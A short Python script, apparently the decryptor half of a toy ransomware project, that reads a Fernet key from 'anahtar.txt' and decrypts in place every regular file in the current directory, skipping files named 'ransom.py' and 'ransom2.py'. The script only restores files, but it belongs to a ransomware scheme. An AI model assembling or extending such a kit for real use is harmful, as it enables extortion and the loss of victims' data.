import os

from cryptography.fernet import Fernet

dosyalar = list()

for i in os.listdir():

	if i == "anahtar.txt":

		continue

	if i == "ransom.py" or i == "ransom2.py":

		continue

	if os.path.isdir(i):

		continue

	dosyalar.append(i)

with open("anahtar.txt","rb") as dosya:

	anahtar = dosya.read()

for i in dosyalar:

	with open(i , "rb") as dosya:

		icerik = dosya.read()

	sifre_kirma = Fernet(anahtar).decrypt(icerik)

	with open(i , "wb") as dosya:

		dosya.write(sifre_kirma)